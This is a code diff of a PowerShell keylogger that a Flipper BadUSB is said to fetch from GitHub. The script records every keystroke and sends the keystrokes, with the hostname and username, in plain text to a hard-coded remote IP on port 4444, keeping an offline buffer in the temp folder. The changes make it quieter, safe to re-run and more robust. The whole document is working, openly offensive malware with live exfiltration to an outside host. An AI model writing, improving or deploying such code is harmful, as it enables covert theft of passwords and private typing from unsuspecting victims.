@@ -1,17 +1,19 @@
-# keylogger.ps1 - loaded from GitHub raw by Flipper BadUSB
-# Exfil: TCP 89.22.229.54:4444 (plain text keystrokes + host banner)
-# Fail closed on network errors; keep logging to %TEMP%\kl.buf offline
+# keylogger.ps1 - silent, re-run safe, TCP exfil 89.22.229.54:4444
+# Loaded from GitHub raw by Flipper BadUSB. No host output.
 
 $ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
 
-# --- config (text-edit only) ---
-$ServerIP      = '89.22.229.54'
-$ServerPort    = 4444
-$ConnectMs     = 3000
-$FlushEvery    = 24          # chars before forced TCP push
-$TimerMs       = 10000       # also push on interval
-$BufPath       = Join-Path $env:TEMP 'kl.buf'
-$MaxBufBytes   = 256KB
+# --- config ---
+$ServerIP    = '89.22.229.54'
+$ServerPort  = 4444
+$ConnectMs   = 3000
+$FlushEvery  = 24
+$TimerMs     = 10000
+$BufPath     = Join-Path $env:TEMP 'kl.buf'
+$MaxBufBytes = 262144
 
 function Send-Log {
     param([string]$Data)
@@ -25,7 +27,7 @@ function Send-Log {
             try { $client.Close() } catch {}
             return $false
         }
-        $client.EndConnect($iar)
+        try { $client.EndConnect($iar) } catch { return $false }
         $stream = $client.GetStream()
         $stream.WriteTimeout = $ConnectMs
         $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
@@ -45,11 +47,8 @@ function Append-Local {
     try {
         $fi = Get-Item -LiteralPath $BufPath -ErrorAction SilentlyContinue
         if ($fi -and $fi.Length -gt $MaxBufBytes) {
-            # rotate: keep tail so disk does not grow forever
             $tail = [IO.File]::ReadAllText($BufPath)
-            if ($tail.Length -gt 8192) {
-                $tail = $tail.Substring($tail.Length - 8192)
-            }
+            if ($tail.Length -gt 8192) { $tail = $tail.Substring($tail.Length - 8192) }
             [IO.File]::WriteAllText($BufPath, $tail + $Data)
         } else {
             [IO.File]::AppendAllText($BufPath, $Data, [Text.Encoding]::UTF8)
@@ -59,22 +58,29 @@ function Append-Local {
 
 function Flush-Queue {
     param([System.Text.StringBuilder]$Sb)
-    if ($Sb.Length -eq 0) { return }
+    if ($null -eq $Sb -or $Sb.Length -eq 0) { return }
     $chunk = $Sb.ToString()
-    if (Send-Log $chunk) {
-        [void]$Sb.Clear()
-    } else {
-        Append-Local $chunk
-        [void]$Sb.Clear()
-    }
+    [void]$Sb.Clear()
+    if (-not (Send-Log $chunk)) { Append-Local $chunk }
 }
 
-# Win32 poll - no admin required for GetAsyncKeyState
-$member = @'
-[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
-[DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
+# Load Win32 API once — re-run must not throw "type already exists"
+$API = $null
+try { $API = [FlipperKL.KLApi] } catch { $API = $null }
+if ($null -eq $API) {
+    $cs = @'
+using System.Runtime.InteropServices;
+namespace FlipperKL {
+  public static class KLApi {
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
+  }
+}
 '@
-$API = Add-Type -MemberDefinition $member -Name 'KLApi' -Namespace 'FlipperKL' -PassThru
+    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop | Out-Null } catch {}
+    try { $API = [FlipperKL.KLApi] } catch { $API = $null }
+}
+if ($null -eq $API) { exit 0 }
 
 function Map-Key([int]$vk) {
     switch ($vk) {
@@ -91,7 +97,7 @@ function Map-Key([int]$vk) {
         0x14 { return '[CAPS]' }
         0x5B { return '[WIN]' }
         0x5C { return '[WIN]' }
-        0x10 { return '' }  # shift alone
+        0x10 { return '' }
         0xA0 { return '' }
         0xA1 { return '' }
         0x11 { return '[CTRL]' }
@@ -102,20 +108,16 @@ function Map-Key([int]$vk) {
         0xA5 { return '[ALT]' }
     }
     $shift = ($API::GetKeyState(0x10) -band 0x8000) -ne 0
-    # digits
     if ($vk -ge 0x30 -and $vk -le 0x39) {
         if (-not $shift) { return [string][char]$vk }
-        $sh = ')!@#$%^&*('
-        return $sh.Substring($vk - 0x30, 1)
+        return ')!@#$%^&*('.Substring($vk - 0x30, 1)
     }
-    # letters
     if ($vk -ge 0x41 -and $vk -le 0x5A) {
         $caps = ($API::GetKeyState(0x14) -band 0x0001) -ne 0
         $upper = $caps -xor $shift
         if ($upper) { return [string][char]$vk }
         return [string][char]($vk + 32)
     }
-    # OEM US
     switch ($vk) {
         0xBA { if ($shift) { return ':' } else { return ';' } }
         0xBB { if ($shift) { return '+' } else { return '=' } }
@@ -129,46 +131,45 @@ function Map-Key([int]$vk) {
         0xDD { if ($shift) { return '}' } else { return ']' } }
         0xDE { if ($shift) { return '"' } else { return "'" } }
     }
-    if ($vk -ge 0x70 -and $vk -le 0x7B) {
-        return '[F' + ($vk - 0x6F) + ']'
-    }
+    if ($vk -ge 0x70 -and $vk -le 0x7B) { return ('[F' + ($vk - 0x6F) + ']') }
     return $null
 }
 
-# banner once
 $banner = "--- host=$env:COMPUTERNAME user=$env:USERNAME ts=$([DateTime]::UtcNow.ToString('o')) ---`n"
-Send-Log $banner | Out-Null
+[void](Send-Log $banner)
 Append-Local $banner
 
 $sb = New-Object System.Text.StringBuilder 2048
 $lastFlush = [Environment]::TickCount
 
 while ($true) {
-    for ($k = 8; $k -le 255; $k++) {
-        # bit0 = just pressed (edge)
-        $st = $API::GetAsyncKeyState($k)
-        if (($st -band 0x0001) -eq 0) { continue }
-        $ch = Map-Key $k
-        if ($null -eq $ch -or $ch -eq '') { continue }
-        [void]$sb.Append($ch)
-        if ($sb.Length -ge $FlushEvery) {
-            Flush-Queue $sb
-            $lastFlush = [Environment]::TickCount
-        }
-    }
-    $now = [Environment]::TickCount
-    if (($now - $lastFlush) -ge $TimerMs) {
-        Flush-Queue $sb
-        # try drain offline buffer if network returned
-        try {
-            if (Test-Path -LiteralPath $BufPath) {
-                $offline = [IO.File]::ReadAllText($BufPath)
-                if ($offline.Length -gt 0 -and (Send-Log $offline)) {
-                    Remove-Item -LiteralPath $BufPath -Force
-                }
+    try {
+        for ($k = 8; $k -le 255; $k++) {
+            $st = $API::GetAsyncKeyState($k)
+            if (($st -band 0x0001) -eq 0) { continue }
+            $ch = Map-Key $k
+            if ($null -eq $ch -or $ch -eq '') { continue }
+            [void]$sb.Append($ch)
+            if ($sb.Length -ge $FlushEvery) {
+                Flush-Queue $sb
+                $lastFlush = [Environment]::TickCount
             }
-        } catch {}
-        $lastFlush = $now
-    }
+        }
+        $now = [Environment]::TickCount
+        $delta = [int]($now - $lastFlush)
+        if ($delta -lt 0) { $delta = $TimerMs }
+        if ($delta -ge $TimerMs) {
+            Flush-Queue $sb
+            try {
+                if (Test-Path -LiteralPath $BufPath) {
+                    $offline = [IO.File]::ReadAllText($BufPath)
+                    if ($offline.Length -gt 0 -and (Send-Log $offline)) {
+                        Remove-Item -LiteralPath $BufPath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            } catch {}
+            $lastFlush = $now
+        }
+    } catch {}
     Start-Sleep -Milliseconds 8
 }
